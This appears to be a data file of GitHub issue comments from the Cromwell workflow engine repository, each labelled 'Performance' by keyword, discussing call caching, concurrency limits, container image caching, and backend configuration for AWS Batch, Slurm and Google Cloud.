Performance,"Had a brief chat w/ @dshiga - I was wondering if all slowness was directly tied to reading from metadata or general slowness and it was the latter (not that it couldn't be _caused_ by reading from MD, but it's across the board slowness). Three thoughts:; - We were talking yesterday about how someone not named me should try setting up typesafe monitor and use it to debug/profile/analyze. No time like the present!; - I can't find the ticket (@kcibul - do you know the right string to search for?) but we should look into the thread pools/dispatchers. This could be a case where something is bringing down the whole system but bulkheading would keep everything else responsive; - A while back we talked about streamlining submission such that WF submissions get a ""Submitted"" status but aren't necessarily immediately launched, and the system would pull them - allowing us to tune the rate at which we pull. Perhaps time to resurrect this one?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228412772:877,tune,tune,877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228412772,1,['tune'],['tune']
Performance,"Happened again last night:. ```; The code passed to eventually never returned normally. Attempted 30 times over 3.33454509745 minutes. Last failure message: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp).; ```. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 30 times over 3.33454509745 minutes. Last failure message: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp).; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$new$5(HealthMonitorServiceActorSpec.scala:81); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.withFixture(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.Su",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:662,concurren,concurrent,662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,3,['concurren'],['concurrent']
Performance,"Has there been any further discussion about this issue? Our team was also recently hit by a large egress charge for inter-continent docker image pulls by Cromwell -- we'd really like to be able set our image repositories to requester-pays to prevent that. . Having Cromwell/PAPI cache images would also really help to mitigate the problem -- similarly to @freeseek our workflow is structured to scatter some steps quite widely, so one relatively small workflow run can currently result in hundreds of docker pulls of the same image.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789:279,cache,cache,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789,1,['cache'],['cache']
Performance,"Have you run this under heavy load? If so, how does it react?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282294665:30,load,load,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282294665,1,['load'],['load']
Performance,"Heh, fair point :). I just meant that it's probably not worth worrying about optimizing stuff around submission (although there are other aspects at play here besides submission) since itll need to be changed around soon anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201106013:77,optimiz,optimizing,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201106013,1,['optimiz'],['optimizing']
Performance,"Hello - @vsoch has pointed me over here, and reminded me of https://github.com/hpcng/singularity/issues/5309 which I'll respond to shortly. It may be useful to note here that in the forthcoming singularity 3.6 the cache functionality is rewritten to drop the additional directory structure and stuff that caused race conditions. We now fetch cache entries to a tmp name, and rename - so assuming the filesystem the the cache dir is on supports atomic rename there shouldn't be concurrency issues. This will not prevent the need to work around it here for older singularity versions, though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-636151836:214,cache,cache,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-636151836,5,"['cache', 'concurren', 'race condition']","['cache', 'concurrency', 'race conditions']"
Performance,"Hello @ruchim :-). The Spark job will run just as good in Yarn as in Mesos, I am pretty sure about that. Main difference is that Mesos is much more advanced than Yarn. It is more scalable, both in terms of nr of nodes, nr of jobs, and types of jobs and applications. . In Mesos, you can run both normal applications (web apps etc.), like you do in Kubernetes, and you can run compute / Big Data processing jobs in the same cluster. You can schedule both cpu and memory usage, not only memory usage as in Yarn. Mesos creates a virtual operating system on top of your cluster, kind of. Yarn is not capable of that as I know it. You can even run Yarn and Kubernetes on top of Mesos etc. Choosing Mesos over Yarn, will therefor make sense for many companies, because you get one system to rule them all. It might add more complexity also though ... I am a bit dated on this, Yarn might have evolved since I looked at it. This article is good at explaining the difference:. https://www.oreilly.com/ideas/a-tale-of-two-clusters-mesos-and-yarn. Here is a nice summary of the main differences:; https://data-flair.training/blogs/comparison-between-apache-mesos-vs-hadoop-yarn/. Hope this give some answers :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3461#issuecomment-417230977:179,scalab,scalable,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3461#issuecomment-417230977,1,['scalab'],['scalable']
Performance,"Here is an example for cromwell.conf backend for AWS-EFS or any shared mountable file system for AWSBATCH.; Please make sure you mount the EFS to /your-root on cromwell-server host and batch-computes.; One way of doing this automatically is thro' a LaunchTemplate. . backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; root = ""/your-root/cromwell_execution""; auth = ""default""; default-runtime-attributes { queueArn = ""xxxx"" }; filesystems { local { auth = ""default"" } }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585500837:562,queue,queueArn,562,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585500837,1,['queue'],['queueArn']
Performance,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:475,cache,cache,475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693,6,['cache'],"['cache', 'cached']"
Performance,"Here is the config file used for the above. ```; ﻿include required(classpath(""application"")). ""workflow_failure_mode"": ""ContinueWhilePossible"". webservice {; port = 2525; }. system.file-hash-cache=true. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; # driver = ""com.mysql.jdbc.Driver""; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://xxxxxx:xxxx/xxx?rewriteBatchedStatements=true&useSSL=false""; user = ""xxx""; password = ""xxx""; connectionTimeout = 120000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xx:role/xxx""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://xxx/cromwell-output""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default""; // diff 2:; numSubmitAttempts = 1; // diff 3:; numCreateDefinitionAttempts = 1; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-west-2:xxx:job-queue/xxx""; }; filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020:191,cache,cache,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020,4,"['cache', 'queue']","['cache', 'cache-results', 'queue', 'queueArn']"
Performance,"Here is the size optimization that deletes untested jython files:. https://github.com/broadinstitute/heterodon/blob/b54010d4f1fe9395f854ab62e4b66c203bf3f45d/build.sh#L82-L84. If we come up with a CI regression case for Windows (x64?) then the appropriate files could be excluded from the filter and tested. Re: the borked Cromwell, we could catch-and-box the thrown `java.lang.Error` into a `java.lang.Exception` and Cromwell would handle this particular error more gracefully.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-481487720:17,optimiz,optimization,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-481487720,1,['optimiz'],['optimization']
Performance,"Here is the terminal output, for posterity:. The first command with internet, confirms we are using a cached image:; ```bash; $ singularity exec docker://busybox ls; INFO: Using cached SIF image; CHANGELOG.md LICENSE README.md dist paper qme.egg-info setup.py; Dockerfile MANIFEST.in build docs qme setup.cfg tests; ```; then I took off my wireless :scream: and ran the same - we know the image is in the cache:. ```bash; $ singularity exec docker://busybox ls; FATAL: Unable to handle docker://busybox uri: failed to get checksum for docker://busybox: error pinging docker registry registry-1.docker.io: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: no such host; ```; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046:102,cache,cached,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046,3,['cache'],"['cache', 'cached']"
Performance,"Hey @TMiguelT, I made a few small changes to udocker, added the notes we discussed and a next steps section to follow the general template of the other tutorials. I wanted to add a small section about the caching of udocker images but don't know udocker well enough to really assert this:. > #### Caching in udocker; > udocker caches images within the install or user directory, thus reducing the need to pull and build the docker containers at every stage. Clarification is required on whether udocker will concurrently write to the same cache directory for largely scattered workflows. So I've just left it out. I also think it might be worth saying more explicitly that Singularity is technically user-installable (just without `setuid`, as I didn't realise until our conversation. If you're happy with what's there now, I'll remove the WIP and put it up for review again. If there's anyone out there reading, we'd love to get your feedback or clarification on any points.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464519232:327,cache,caches,327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464519232,3,"['cache', 'concurren']","['cache', 'caches', 'concurrently']"
Performance,"Hey @Xophmeister, sorry for the slow response time!. This error message is actually coming from our SFS (shared filesystem) backend (so I'll ping @kshakir). I'm not familiar with the `mounts` attribute in the SFS. However, I think the answer to your question is that none of the attributes asked for by the SFS backend are arrays, and so arrays are not a supported attribute type. . I actually could only find reference to the `mounts` attribute outside of the SFS backend in places like BCS and Google cloud. I wonder whether you just need to move this attribute out of your configuration file and into your WDL task itself?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4685#issuecomment-481024411:37,response time,response time,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4685#issuecomment-481024411,1,['response time'],['response time']
Performance,"Hey @antonkulaga, these aren't exactly what you're after but there are two things you could have a look at that should help:; - You can use the `concurrent-job-limit` for the local backend to limit how many jobs (i.e. calls being run) are happening at any given time. That should cause things to slow down naturally without having to manually pause/resume them, which might help. In the config:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```. - The second item (not re-running early tasks) should be helped by [call caching](https://github.com/broadinstitute/cromwell#call-caching). As long as nothing changes in the intermediate steps, Cromwell should be able to detect and re-use your previous results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527:145,concurren,concurrent-job-limit,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527,2,['concurren'],['concurrent-job-limit']
Performance,"Hey @benjamincarlin,. The call caching feature is really designed with the focus on not having to recomputing outputs. In the case of the monitoring script, it really was meant to be treated as a debugging tool and not a true output from a task. Can you explain why you need to the monitoring log for cached jobs, especially as its not new information? Is the motivation to be able to access all monitoring logs under one workflow uuid directory?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805:301,cache,cached,301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805,1,['cache'],['cached']
Performance,"Hey @bolton-lab, just FYI this is probably more of a WDL forum sort of thing. But generally, you've noted you don't want to perform execution where your inputs are localised to, if you need to mutate or reuse them, you should copy them to your execution folder by adding a copy in your command block together with the `basename` function, eg:. ```wdl; # task index {; command {; set -e -o pipefail; cp ~{bam} ~{basename(bam)}; /opt/samtools/bin/samtools index ~{basename(bam)} ~{basename(bam)}.bai; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6182#issuecomment-774772321:124,perform,perform,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6182#issuecomment-774772321,1,['perform'],['perform']
Performance,"Hey @cmarkello, unrelated to your initial problem, but how do you find the performance of the file-hash based caching for Cromwell? We've found it to be incredibly CPU / memory / network intensive for large (~250GB) input files so looking for alternatives (#5346).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806:75,perform,performance,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806,1,['perform'],['performance']
Performance,"Hey @rhpvorderman, I've started to use this for our workflows and seems to be working well! Props for this change :). I've got a small suggestion (not enough to raise an issue, and only if you're already making other changes), it would be awesome if Cromwell could log a message to say that it's copying files. I watch for that because then I know the task is starting properly. . Unrelated to that, I was wondering what hurdles might have to be overcome to devise a hashing-strategy based on your new `cached-copy` (that's not File / md5). You've mentioned [before](https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332) that this might be possible as it doesn't depend on the final path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924:503,cache,cached-copy,503,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924,1,['cache'],['cached-copy']
Performance,"Hey @rhpvorderman, just wanted to check in and say this has been working great!. I was thinking about adding a new one, called ""cached-hardlink"" or so, but instead of always copying, it would try to hard-link it first. We have the use case where often our bigger sequence data is on the same disk, but some reference files are not. My plan was to just follow your pattern, but use a modified `localizePathViaCachedCopy` (like `localizePathViaHardlink`). Do you have any advice if I were to give it a crack over the EOY break?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-568303076:128,cache,cached-hardlink,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-568303076,1,['cache'],['cached-hardlink']
Performance,"Hey Jing,. Regarding call caching misses -- there should be something message in the workflow metadata for why it failed, will you be able to share workflow metadata from the second workflow that fails to cache?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440498120:205,cache,cache,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440498120,1,['cache'],['cache']
Performance,"Hi !; Just to make sure I understand, are you saying that the monitoring log is not copied over when a call is being cached ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433937512:117,cache,cached,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433937512,1,['cache'],['cached']
Performance,"Hi @aednichols @cjllanwarne ; I'm really sorry for long reply. I'm so overworked that it took a month for me to get this done.; I've rebased this pull request, as well as two others (https://github.com/broadinstitute/cromwell/pull/6072 and https://github.com/broadinstitute/cromwell/pull/6081) at the develop branch.; Unfortunately, I couldn't find a way to resolve all comments. I did add tests to the CallCacheDiffActorSpec in this PR https://github.com/broadinstitute/cromwell/pull/6081. But I didn't find a way to properly test this PR https://github.com/broadinstitute/cromwell/pull/6072 nor to check how it will affect performance.; Please let me know if this PRs are okay for you in their current state. I can make some minor changes if required. But If they require a lot of time than I'm afraid I won't be able to maintain them and it's better to close them. I promise this time I'll respond to your comments faster :); Huge thanks for your invitation, although it already expired. I would love to continue to contribute to Cromwell. But right now it's almost impossible for me to find enough time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799:625,perform,performance,625,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799,1,['perform'],['performance']
Performance,"Hi @cjllanwarne ; 1. I'm not an expert in databases, so I'm not sure. In my opinion, it may become even better, because in case of hundreds excluded ids we can filter them out before expensive joins or other filtrations. I'll try to do something to check that it won't cause performance penalties.; 2. I tried to find a way to test it, but it is very tricky to me. I was hoping you will give me some hint on how to do it :); 3. Will do",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666:275,perform,performance,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666,1,['perform'],['performance']
Performance,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:193,QUEUE,QUEUED,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630,1,['QUEUE'],['QUEUED']
Performance,"Hi @dtenenba , we fully appreciate the importance of call caching and are looking into this. can I confirm a few things:. * that this is occurring on different files each run?; * you are seeing it every run of non-trivial size; * You have experienced at least one call-cache success run of any workflow (including a trivial one). This will help me narrow down what is going on. . To be clear, this should be working and we are aware that hashing is not a manual process but a simple value lookup.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894:269,cache,cache,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894,1,['cache'],['cache']
Performance,"Hi @likeanowl , thanks for your interest. I'm tempted to close this issue. I speculated that there could be contention. However, we have since moved to an isolated process for the summarizer, rendering this issue moot for us. . If you do work on this issue I would focus on developing a load test that can look at whether the thread pool suffers (is under heavy contenion) when under high metadata write load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4762#issuecomment-518674483:287,load,load,287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4762#issuecomment-518674483,2,['load'],['load']
Performance,"Hi @myazinn, sorry for the slow response time, and I haven't really looked at this in detail, but it looks like we'll now be calling the same function twice for the same stderr file (once for the job message and once for the workflow message)? Is that right?. What I mean is, when a task within a workflow fails, do we now download the same stderr file twice?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5096#issuecomment-519629045:32,response time,response time,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5096#issuecomment-519629045,1,['response time'],['response time']
Performance,"Hi @myazinn,. @rhpvorderman indeed solved this issue by implementing the cached-copy localization strategy. So no, this issue is no longer relevant.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4711#issuecomment-518199844:73,cache,cached-copy,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4711#issuecomment-518199844,1,['cache'],['cached-copy']
Performance,"Hi @rasmuse - a few thoughts. In terms of the submit time keep in mind things like JVM initialization. Calling individual invocations of a java program like that for what's effectively a blink of an eye operation is never going to be ideal from a performance perspective. If you're submitting to a Cromwell server consider using something like `curl` instead. . On the second part, there are a few things potentially going on here. First is that Cromwell doesn't necessarily immediately start a workflow. It scans every `n` seconds for new workflows to start, which defaults to `20`. In a worst case scenario `21` of your `20` seconds could be due to that, although that seems unlikely. You can make that time window shorter by overriding the `system.new-workflow-poll-rate` configuration setting to something smaller, e.g. `1`. Even then, there's a some overhead in there as ultimately we're trying to optimize for a case that's not running single, extremely short tasks. I just ran the moral equivalent of a hello world workflow locally with that config setting set to 1 second. The workflow was picked up for execution at `11:08:44` and registered as complete at `11:08:51` with exactly half of that time spent with the system running the underlying job (i.e. not in Cromwell) so it might be worth revisiting this w/ a combination of using `curl` and speeding up the workflow polling rate. That said while I'd love you to continue to use Cromwell/WDL, it might not wind up being the best tool for your job. If these workflows are purely for yourself & you don't intend on building them up over time and/or distributing them to others, you might want to check out Snakemake which is more intended to be a direct Makefile replacement.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-378636936:247,perform,performance,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-378636936,2,"['optimiz', 'perform']","['optimize', 'performance']"
Performance,"Hi @rasmuse, I lead the Cromwell Languages team here at the Broad (a small offshoot team from the main Cromwell team). Ultimately, Cromwell will always aim to be a production scale engine, but my team is especially interested in anything that makes reading, writing, testing, experimenting with and debugging workflows easier... If you're serious about trying to make an ""optimized for small local tasks"" implementation of a WDL engine, that definitely sounds like something that could definitely help out our workflow authors too... so do let me know if it goes anywhere and if we can help out at all! Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-379037212:372,optimiz,optimized,372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-379037212,1,['optimiz'],['optimized']
Performance,Hi @seandavi - you'll want to use the `concurrent-job-limit` field in your backend config (see the `reference.conf` for more details) which was put in for exactly this reason. It's a crude implement but the local backend was intended more as a debug/noodling around backend and not a full on scheduler.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-309215718:39,concurren,concurrent-job-limit,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-309215718,1,['concurren'],['concurrent-job-limit']
Performance,"Hi @vsoch - here's what I have. A word of warning that I found it in an email thread where a user was saying it didn't work for them, but it came from someone for whom it **did** work so YMMV. I'm going to try to try this out myself later although it'll take me a while before I get time to install `udocker` and such. ```; backend {. # Override the default backend. #default = ""LocalExample"". . # The list of providers. providers {. . # The local provider is included by default in the reference.conf. This is an example. . # Define a new backend provider. Local {. # The actor that runs the backend. In this case, it's the Shared File System (SFS) ConfigBackend. actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". . # The backend custom configuration. config {. . # Optional limits on the number of concurrent jobs. #concurrent-job-limit = 5. . # If true submits scripts to the bash background using ""&"". Only usefull for dispatchers that do NOT submit. # the job and then immediately return a scheduled job id. run-in-background = true. . # `temporary-directory` creates the temporary directory for commands. #. # If this value is not set explicitly, the default value creates a unique temporary directory, equivalent to:. # temporary-directory = ""$(mktemp -d \""$PWD\""/tmp.XXXXXX)"". #. # The expression is run from the execution directory for the script. The expression must create the directory. # if it does not exist, and then return the full path to the directory. #. # To create and return a non-random temporary directory, use something like:. # temporary-directory = ""$(mkdir -p /tmp/mydir && echo /tmp/mydir)"". . # `script-epilogue` configures a shell command to run after the execution of every command block. #. # If this value is not set explicitly, the default value is `sync`, equivalent to:. # script-epilogue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possibl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:837,concurren,concurrent,837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,2,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"Hi @wleepang . Yes, you are right. The problem I have is particularly when using a slurm backend, as I don't find an easy way to load environment modules except to actually modify the individual command section of each task definition in my workflow. This is inconvenient because when I'm running the same pipeline on AWS batch, there are no environment modules, so my tasks fail unless I explicitly remove all the `module load <module name>` from the command part of each task. I would like to switch back and forth between cloud and cluster without having to touch the pipeline script (i.e. individual tasks) itself. Put differently, can I specify a runtime attribute called `module` much like the `docker` attribute, and then somehow modify the backend configuration settings to have cromwell load this module? . Did I explain myself better this time?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502902782:129,load,load,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502902782,3,['load'],['load']
